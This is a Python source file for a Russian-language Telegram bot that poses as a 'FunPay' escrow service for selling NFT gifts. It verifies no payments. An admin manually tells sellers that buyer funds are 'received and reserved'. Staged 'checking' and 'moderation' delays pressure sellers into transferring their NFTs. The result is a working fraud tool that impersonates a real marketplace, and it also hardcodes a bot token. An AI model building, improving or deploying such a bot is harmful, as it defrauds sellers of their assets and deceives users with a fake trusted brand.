import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
ADMIN_ID = 7532797597  
SUPPORT_LINK = "https://t.me/FunPayHelperRU"
COMMISSION_RATE = 0.03
# ============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

users_db = {}
active_deals = {}
deal_counter = 1

class CreateDeal(StatesGroup):
    amount = State()
    nft_link = State()
    wait_bank = State()
    wait_phone = State()

def gen_deal_id():
    global deal_counter
    deal_id = f"FUN-{deal_counter:04d}"
    deal_counter += 1
    return deal_id

# --- МЕНЮ (ИНЛАЙН, КРЕПИТСЯ К СООБЩЕНИЮ) ---
def inline_main_menu(user_id):
    lang = users_db.get(user_id, {}).get("lang", "RU")
    
    if lang == "RU":
        kb = [
            [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="menu_create")],
            [InlineKeyboardButton(text="📦 Мои сделки", callback_data="menu_deals"),
             InlineKeyboardButton(text="💳 Реквизиты", callback_data="menu_details")],
            [InlineKeyboardButton(text="🌐 Язык", callback_data="menu_lang"),
             InlineKeyboardButton(text="🆘 Поддержка", callback_data="menu_support")]
        ]
    else:
        kb = [
            [InlineKeyboardButton(text="🤝 Create deal", callback_data="menu_create")],
            [InlineKeyboardButton(text="📦 My deals", callback_data="menu_deals"),
             InlineKeyboardButton(text="💳 Details", callback_data="menu_details")],
            [InlineKeyboardButton(text="🌐 Language", callback_data="menu_lang"),
             InlineKeyboardButton(text="🆘 Support", callback_data="menu_support")]
        ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

# --- СТАРТ (ОДНО СООБЩЕНИЕ: КАРТИНКА + ТЕКСТ + ИНЛАЙН-КНОПКИ) ---
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    if user_id not in users_db:
        users_db[user_id] = {"lang": "RU", "bank": None, "phone": None}
    
    welcome_text = (
        "Добро пожаловать 👋\n\n"
        "🛡 FunPay — Мы специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
        "✨ Автоматизированный алгоритм исполнения.\n"
        "⚡ Скорость и автоматизация.\n"
        "📊 Удобный и быстрый вывод средств.\n\n"
        "▪️ Комиссия сервиса: 3%\n"
        "▪️ Режим работы: 24/7\n"
        "▪️ Техническая поддержка: @FunPayHelperRU\n\n"
        "👇 Выберите нужный раздел ниже:"
    )
    
    await message.answer_photo(
        photo="AgACAgIAAxkBAAEDIx1q825ucePNRzdgkIAGbyBxZMNAdAACxyFrG23gmUtey3umHg-B8gEAAwIAA3MAAz0E",
        caption=welcome_text,
        parse_mode="HTML",
        reply_markup=inline_main_menu(user_id)
    )

# ================= ОБРАБОТЧИКИ ИНЛАЙН-МЕНЮ =================

@dp.callback_query(F.data == "menu_back")
async def menu_back(call: CallbackQuery):
    await call.message.delete()
    await cmd_start(call.message)
    await call.answer()

@dp.callback_query(F.data == "menu_create")
async def menu_create(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    await start_deal_process(call.message, state)
    await call.answer()

@dp.callback_query(F.data == "menu_deals")
async def menu_deals(call: CallbackQuery):
    user_deals = [d for d in active_deals.values() if d["seller_id"] == call.from_user.id or d["buyer_id"] == call.from_user.id]
    
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
    
    if not user_deals:
        return await call.message.edit_caption(caption="📦 У вас пока нет сделок.", reply_markup=back_kb)
    
    text = "<b>📦 История ваших сделок:</b>\n\n"
    for d in reversed(user_deals):
        status_emoji = "🟢" if d["status"] == "completed" else "🟡"
        text += f"{status_emoji} <b>#{d['id']}</b> | {d['amount']} RUB\n└ Статус: {d['status'].upper()}\n\n"
    
    await call.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=back_kb)
    await call.answer()

@dp.callback_query(F.data == "menu_details")
async def menu_details(call: CallbackQuery):
    user = users_db.get(call.from_user.id)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Изменить", callback_data="menu_change_details")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]
    ])
    
    if user["bank"]:
        text = f"💳 <b>Ваши сохраненные реквизиты:</b>\n\n🏦 Банк: {user['bank']}\n📱 Тел: {user['phone']}"
    else:
        text = "💳 У вас еще нет сохраненных реквизитов."
    
    await call.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=back_kb)
    await call.answer()

@dp.callback_query(F.data == "menu_support")
async def menu_support(call: CallbackQuery):
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
    text = f"🆘 <b>Техническая поддержка</b>\n\nЕсли у вас возникли вопросы, напишите нашему менеджеру:\n👉 {SUPPORT_LINK}"
    await call.message.edit_caption(caption=text, parse_mode="HTML", reply_markup=back_kb)
    await call.answer()

# --- 1. СОЗДАНИЕ СДЕЛКИ ---
async def start_deal_process(message: Message, state: FSMContext):
    user = users_db.get(message.from_user.id)
    
    if user["bank"]:
        await message.answer(f"✅ Использую ваши реквизиты:\n🏦 {user['bank']}\n📱 {user['phone']}\n\n💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
        await state.update_data(bank=user["bank"], phone=user["phone"])
        await state.set_state(CreateDeal.amount)
    else:
        await message.answer("🏦 <b>Введите название вашего банка:</b>", parse_mode="HTML")
        await state.set_state(CreateDeal.wait_bank)

@dp.message(CreateDeal.wait_bank)
async def process_bank(message: Message, state: FSMContext):
    await state.update_data(bank=message.text)
    await message.answer("📱 Введите ваш номер телефона:")
    await state.set_state(CreateDeal.wait_phone)

@dp.message(CreateDeal.wait_phone)
async def process_phone(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    data = await state.get_data()
    users_db[message.from_user.id]["bank"] = data["bank"]
    users_db[message.from_user.id]["phone"] = data["phone"]
    
    await message.answer("💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
    await state.set_state(CreateDeal.amount)

@dp.message(CreateDeal.amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
    except ValueError:
        return await message.answer("❌ Введите сумму целым числом.")
    
    await state.update_data(amount=amount)
    await message.answer("🖼 <b>Отправьте ссылку на ваш NFT (подарок):</b>", parse_mode="HTML")
    await state.set_state(CreateDeal.nft_link)

@dp.message(CreateDeal.nft_link)
async def process_nft(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    msg = await message.answer("⏳ <i>Проверка данных и создание защищенной сделки...</i>", parse_mode="HTML")
    await asyncio.sleep(2)
    
    deal_id = gen_deal_id()
    active_deals[deal_id] = {
        "id": deal_id,
        "seller_id": message.from_user.id,
        "seller_name": message.from_user.username or message.from_user.first_name,
        "buyer_id": None,
        "bank_name": data["bank"],
        "phone": data["phone"],
        "amount": data["amount"],
        "nft_link": message.text,
        "status": "open"
    }
    
    bot_info = await bot.get_me()
    pay_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    await msg.edit_text(
        f"✅ <b>Сделка успешно создана!</b>\n\n"
        f"🆔 ID: <code>{deal_id}</code>\n"
        f"💰 Сумма: {data['amount']} RUB\n"
        f"🏦 Реквизиты: {data['bank']} ({data['phone']})\n\n"
        f"<b>Ссылка для покупателя:</b>\n<code>{pay_link}</code>",
        parse_mode="HTML"
    )
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН: НОВАЯ СДЕЛКА</b>\n\n"
             f"🆔 ID: {deal_id}\n"
             f"👤 Продавец: @{active_deals[deal_id]['seller_name']}\n"
             f"💰 Сумма: {data['amount']} RUB\n"
             f"🏦 Банк: {data['bank']}\n"
             f"📱 Тел: {data['phone']}\n"
             f"🖼 NFT: {message.text}",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ ---
@dp.message(Command("start"), F.text.contains("deal_"))
async def start_deal_by_link(message: Message):
    deal_id = message.text.split("deal_")[1]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await message.answer("❌ Сделка не найдена или уже завершена.")
        
    deal["buyer_id"] = message.from_user.id
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
    ])
    
    await message.answer(
        f"🛒 <b>Безопасная сделка #{deal_id}</b>\n\n"
        f"Продавец: @{deal['seller_name']}\n"
        f"Сумма: {deal['amount']} RUB\n"
        f"Товар: {deal['nft_link']}\n\n"
        f"<b>Реквизиты для оплаты:</b>\n"
        f"Банк: {deal['bank_name']}\n"
        f"Телефон: <code>{deal['phone']}</code>\n\n"
        f"Переведите средства и нажмите кнопку ниже.",
        parse_mode="HTML",
        reply_markup=kb
    )

# --- 3. ПОКУПАТЕЛЬ НАЖАЛ "Я ОПЛАТИЛ" ---
@dp.callback_query(F.data.startswith("pay_"))
async def buyer_paid(call: CallbackQuery):
    deal_id = call.data.split("_")[1]
    deal = active_deals.get(deal_id)
    
    if not deal:
        return await call.answer("Сделка не найдена.", show_alert=True)
    
    deal["status"] = "awaiting_confirm"
    await call.message.edit_text("⏳ <i>Проверяем поступление средств...</i>", parse_mode="HTML")
    await asyncio.sleep(1.5)
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"admin_confirm_{deal_id}"),
         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_reject_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔔 <b>ПОКУПАТЕЛЬ СООБЩИЛ ОБ ОПЛАТЕ</b>\n\n"
             f"🆔 ID: {deal_id}\n"
             f"👤 Покупатель: @{call.from_user.username}\n"
             f"💰 Сумма: {deal['amount']} RUB",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 4. АДМИН ПОДТВЕРЖДАЕТ ИЛИ ОТКЛОНЯЕТ ---
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
    
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    deal["status"] = "paid"
    
    await call.message.edit_text(f"✅ Сделка {deal_id} подтверждена.")
    
    commission = round(deal['amount'] * COMMISSION_RATE)
    net_amount = deal['amount'] - commission
    
    seller_text = (
        f"✅ <b>Средства по сделке получены и зарезервированы!</b>\n\n"
        f"📄 <b>Детали:</b>\n"
        f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
        f"├ Комиссия (3%): <b>{commission} RUB</b>\n"
        f"├ <b>К зачислению: {net_amount} RUB</b>\n"
        f"└ Товар: {deal['nft_link']}\n\n"
        f"Передайте NFT покупателю и нажмите кнопку ниже."
    )
    
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Я передал NFT", callback_data=f"seller_done_{deal_id}")]
    ])
    
    try:
        await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nОжидайте получения NFT.", parse_mode="HTML")
    except: pass

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Нет прав.", show_alert=False)
    
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    deal["status"] = "rejected"
    
    await call.message.edit_text(f"❌ Сделка {deal_id} отклонена.")
    
    try:
        await bot.send_message(deal["seller_id"], f"❌ <b>Сделка {deal_id} отклонена.</b>\nПричина: подозрительная активность.", parse_mode="HTML")
        await bot.send_message(deal["buyer_id"], f"❌ <b>Сделка {deal_id} отклонена администратором.</b>", parse_mode="HTML")
    except: pass

# --- 5. ПРОДАВЕЦ ПЕРЕДАЛ NFT ---
@dp.callback_query(F.data.startswith("seller_done_"))
async def seller_done(call: CallbackQuery):
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    deal["status"] = "moderation"
    
    await call.message.edit_text(
        f"⏳ <b>Заявка принята!</b>\n\n"
        f"🛡 Статус: <i>Передано в отдел модерации</i>\n"
        f"└ Ожидаемое время: <i>до 15 минут</i>",
        parse_mode="HTML"
    )
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить передачу NFT", callback_data=f"admin_confirm_nft_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН: ЗАПРОС НА МОДЕРАЦИЮ</b>\n\n"
             f"🆔 ID: {deal_id}\n"
             f"👤 Продавец: @{deal['seller_name']}\n"
             f"💰 Сумма: {deal['amount']} RUB",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 6. АДМИН ПОДТВЕРЖДАЕТ ПЕРЕДАЧУ NFT ---
@dp.callback_query(F.data.startswith("admin_confirm_nft_"))
async def admin_confirm_nft(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⚠️ Нет прав.", show_alert=False)
    
    deal_id = call.data.split("_")[3]
    deal = active_deals.get(deal_id)
    deal["status"] = "completed"
    
    await call.message.edit_text(f"✅ Модерация пройдена. Сделка {deal_id} закрыта.")
    
    commission = round(deal['amount'] * COMMISSION_RATE)
    net_amount = deal['amount'] - commission
    
    try:
        await bot.send_message(
            deal["seller_id"], 
            f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
            f"✅ <b>Модерация успешно завершена!</b>\n\n"
            f"Передача NFT подтверждена. Сделка закрыта.\n"
            f"К зачислению: <b>{net_amount} RUB</b> (за вычетом комиссии 3%).", 
            parse_mode="HTML"
        )
        await bot.send_message(
            deal["buyer_id"], 
            f"🎉 <b>Сделка {deal_id} успешно завершена!</b>\n\n"
            f"🛡 Проверьте ваш кошелек. Спасибо, что доверяете нам!", 
            parse_mode="HTML"
        )
    except: pass

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
